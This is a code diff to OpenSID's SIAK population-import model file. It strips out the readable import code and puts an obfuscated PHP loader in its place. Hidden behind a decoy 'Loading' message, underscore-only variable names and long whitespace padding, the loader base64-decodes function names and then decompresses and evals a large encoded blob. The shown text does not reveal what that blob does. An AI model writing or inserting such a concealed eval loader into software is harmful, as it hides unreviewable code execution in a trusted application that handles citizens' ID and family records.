@@ -1,265 +1,457 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Siak_model.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-define('KOLOM_IMPOR_SIAK', serialize([
-    'no_kk'             => '1',
-    'nik'               => '2',
-    'nama'              => '3',
-    'status_dasar'      => '4',
-    'tempatlahir'       => '5',
-    'tanggallahir'      => '6',
-    'sex'               => '7',
-    'ayah_nik'          => '8',
-    'nama_ayah'         => '9',
-    'ibu_nik'           => '10',
-    'nama_ibu'          => '11',
-    'status_kawin'      => '12',
-    'kk_level'          => '13',
-    'agama_id'          => '14',
-    'alamat'            => '17',
-    'rw'                => '18',
-    'rt'                => '19',
-    'pendidikan_kk_id'  => '20',
-    'pekerjaan_id'      => '21',
-    'golongan_darah_id' => '23',
-    'cacat_id'          => '24',
-    'dokumen_pasport'   => '28',
-    'akta_lahir'        => '29',
-    'akta_perkawinan'   => '30',
-    'tanggalperkawinan' => '31',
-    'akta_perceraian'   => '32',
-    'tanggalperceraian' => '33',
-    'tgl_entri'         => '37',
-]));
 
-class Siak_model extends Impor_model
-{
-    public function __construct()
-    {
-        parent::__construct();
-        $this->load->model('penduduk_model');
-    }
 
-    /* 	======================================================
-            IMPOR DATA DALAM FORMAT SIAK
-            ======================================================
-    */
 
-    private function cari_baris_pertama($data, $baris)
-    {
-        if ($baris <= 1) {
-            return 0;
-        }
 
-        $baris_pertama = 1;
 
-        for ($i = 2; $i <= $baris; $i++) {
-            // Baris dengan tiga kolom pertama kosong menandakan baris tanpa data
-            if ($data->val($i, 1) == '' && $data->val($i, 2) == '' && $data->val($i, 3) == '') {
-                continue;
-            }
 
-            // Ketemu baris data pertama
-            $baris_pertama = $i;
-            break;
-        }
 
-        return $baris_pertama;
-    }
 
-    private function get_isi_baris($data, int $i)
-    {
-        $kolom_impor         = unserialize(KOLOM_IMPOR_SIAK);
-        $isi_baris['alamat'] = trim($data->val($i, $kolom_impor['alamat']));
-        // alamat berbentuk 'DSN LIWET'
-        $pecah_alamat        = preg_split('/DSN |DS |DUSUN |DSN\\. |DS\\. |DUSUN\\. /i', $isi_baris['alamat']);
-        $isi_baris['alamat'] = $pecah_alamat[0];
-        $isi_baris['dusun']  = $pecah_alamat[1];
-        if (empty($isi_baris['dusun'])) {
-            $isi_baris['dusun'] = $isi_baris['alamat'];
-        }
 
-        $isi_baris['rw'] = ltrim(trim($data->val($i, $kolom_impor['rw'])), "'");
-        $isi_baris['rt'] = ltrim(trim($data->val($i, $kolom_impor['rt'])), "'");
 
-        $nama              = trim($data->val($i, $kolom_impor['nama']));
-        $nama              = preg_replace("/[^a-zA-Z,\\.'-]/", ' ', $nama);
-        $isi_baris['nama'] = $nama;
 
-        // Konversi status dasar dari string / integer.
 
-        $isi_baris['status_dasar'] = $this->get_konversi_kode($this->kode_status_dasar, $data->val($i, $kolom_impor['status_dasar']));
 
-        // Data Disdukcapil adakalanya berisi karakter tambahan pada no_kk dan nik
-        // yang tidak tampak (non-printable characters),
-        // jadi perlu dibuang
-        $no_kk              = trim($data->val($i, $kolom_impor['no_kk']));
-        $no_kk              = preg_replace('/[^0-9]/', '', $no_kk);
-        $isi_baris['no_kk'] = $no_kk;
 
-        $isi_baris['nik']              = buang_nondigit($data->val($i, $kolom_impor['nik']));
-        $isi_baris['sex']              = $this->get_konversi_kode($this->kode_sex, $data->val($i, $kolom_impor['sex']));
-        $isi_baris['tempatlahir']      = trim($data->val($i, $kolom_impor['tempatlahir']));
-        $isi_baris['tanggallahir']     = $this->format_tanggal($data->val($i, $kolom_impor['tanggallahir']));
-        $isi_baris['agama_id']         = $this->get_konversi_kode($this->kode_agama, $data->val($i, $kolom_impor['agama_id']));
-        $isi_baris['pendidikan_kk_id'] = $this->get_konversi_kode($this->kode_pendidikan_kk, $data->val($i, $kolom_impor['pendidikan_kk_id']));
-        $isi_baris['pekerjaan_id']     = $this->get_konversi_kode($this->kode_pekerjaan, $this->normalkan_data($data->val($i, $kolom_impor['pekerjaan_id'])));
-        $isi_baris['status_kawin']     = $this->get_konversi_kode($this->kode_status, $data->val($i, $kolom_impor['status_kawin']));
-        $isi_baris['kk_level']         = $this->get_konversi_kode($this->kode_hubungan, $data->val($i, $kolom_impor['kk_level']));
-        $isi_baris['warganegara_id']   = $this->get_konversi_kode($this->kode_warganegara, $data->val($i, $kolom_impor['warganegara_id']));
 
-        $nama_ayah = trim($data->val($i, $kolom_impor['nama_ayah']));
-        if ($nama_ayah == '') {
-            $nama_ayah = '-';
-        }
-        $isi_baris['nama_ayah'] = $nama_ayah;
 
-        $nama_ibu = trim($data->val($i, $kolom_impor['nama_ibu']));
-        if ($nama_ibu == '') {
-            $nama_ibu = '-';
-        }
-        $isi_baris['nama_ibu'] = $nama_ibu;
 
-        $isi_baris['golongan_darah_id'] = $this->get_konversi_kode($this->kode_golongan_darah, $data->val($i, $kolom_impor['golongan_darah_id']));
-        $isi_baris['akta_lahir']        = trim($data->val($i, $kolom_impor['akta_lahir']));
-        $isi_baris['dokumen_pasport']   = trim($data->val($i, $kolom_impor['dokumen_pasport']));
 
-        $isi_baris['ayah_nik']          = buang_nondigit($data->val($i, $kolom_impor['ayah_nik']));
-        $isi_baris['ibu_nik']           = buang_nondigit($data->val($i, $kolom_impor['ibu_nik']));
-        $isi_baris['akta_perkawinan']   = trim($data->val($i, $kolom_impor['akta_perkawinan']));
-        $isi_baris['tanggalperkawinan'] = $this->format_tanggal($data->val($i, $kolom_impor['tanggalperkawinan']));
-        $isi_baris['akta_perceraian']   = trim($data->val($i, $kolom_impor['akta_perceraian']));
-        $isi_baris['tanggalperceraian'] = $this->format_tanggal($data->val($i, $kolom_impor['tanggalperceraian']));
-        $isi_baris['cacat_id']          = $this->get_konversi_kode($this->kode_cacat, $data->val($i, $kolom_impor['cacat_id']));
 
-        // Untuk tulis ke log_penduduk
-        $isi_baris['status_dasar_orig'] = trim($data->val($i, $kolom_impor['status_dasar']));
-        $isi_baris['tgl_entri']         = $this->format_tanggal($data->val($i, $kolom_impor['tgl_entri']));
 
-        return $isi_baris;
-    }
 
-    // Normalkan kolom seperti "SLTP / SEDERAJAT" menjadi "sltp/sederajat"
-    private function normalkan_data($str)
-    {
-        return preg_replace('/\s*\/\s*/', '/', strtolower(trim($str)));
-    }
 
-    /**
-     * Proses impor data bip
-     *
-     * @param sheet		data excel berisi bip
-     * @param mixed $data
-     *
-     * @return setting $_SESSION untuk info hasil impor
-     *                 $_SESSION['gagal']=						jumlah baris yang gagal
-     *                 $_SESSION['total_keluarga']=	jumlah keluarga yang diimpor
-     *                 $_SESSION['total_penduduk']=	jumlah penduduk yang diimpor
-     *                 $_SESSION['baris']=						daftar baris yang gagal
-     */
-    public function impor_data_bip($data)
-    {
-        // membaca jumlah baris dari data excel
-        $baris = $data->rowcount($sheet_index = 0);
-        if ($this->cari_baris_pertama($data, $baris) <= 1) {
-            return set_session('error', 'Data penduduk gagal diimpor, data tidak tersedia.');
-        }
 
-        $gagal_penduduk = 0;
-        $baris_gagal    = '';
-        $total_keluarga = 0;
-        $total_penduduk = 0;
 
-        // Import data excel mulai baris ke-2 (karena baris pertama adalah nama kolom)
-        for ($i = 2; $i <= $baris; $i++) {
-            // Baris dengan tiga kolom pertama kosong menandakan baris tanpa data
-            if ($data->val($i, 1) == '' && $data->val($i, 2) == '' && $data->val($i, 3) == '') {
-                continue;
-            }
 
-            $isi_baris      = $this->get_isi_baris($data, $i);
-            $error_validasi = $this->data_import_valid($isi_baris);
-            if (empty($error_validasi)) {
-                $this->tulis_tweb_wil_clusterdesa($isi_baris);
-                if ($this->tulis_tweb_keluarga($isi_baris)) {
-                    $total_keluarga++;
-                }
-                $penduduk_baru = $this->tulis_tweb_penduduk($isi_baris);
-                if ($penduduk_baru) {
-                    $total_penduduk++;
-                    // Tulis log kalau status dasar MATI, HILANG atau PINDAH
-                    if (in_array($isi_baris['status_dasar'], ['2', '3', '4'])) {
-                        $this->tulis_log_penduduk($isi_baris, $penduduk_baru);
-                    }
-                }
-            } else {
-                $gagal_penduduk++;
-                $baris_gagal .= $i . ' (' . $error_validasi . ')<br>';
-            }
-        }
 
-        if ($gagal_penduduk == 0) {
-            $baris_gagal = 'tidak ada data yang gagal di import.';
-        }
 
-        $pesan_impor = [
-            'gagal'          => $gagal_penduduk,
-            'total_keluarga' => $total_keluarga,
-            'total_penduduk' => $total_penduduk,
-            'baris'          => $baris_gagal,
-        ];
 
-        set_session('pesan_impor', $pesan_impor);
 
-        return set_session('success', 'Data penduduk berhasil diimpor');
-    }
 
-    private function tulis_log_penduduk($data, $id): void
-    {
-        // Tulis log_penduduk
-        $log = [
-            'id_pend'        => $id,
-            'no_kk'          => $data['no_kk'],
-            'tgl_peristiwa'  => $data['tgl_entri'],
-            'tgl_lapor'      => $data['tgl_entri'],
-            'created_by'     => $this->session->user,
-            'kode_peristiwa' => $data['status_dasar'],
-            'catatan'        => 'Status impor data SIAK: ' . $data['status_dasar_orig'],
-        ];
-        $this->penduduk_model->tulis_log_penduduk_data($log);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
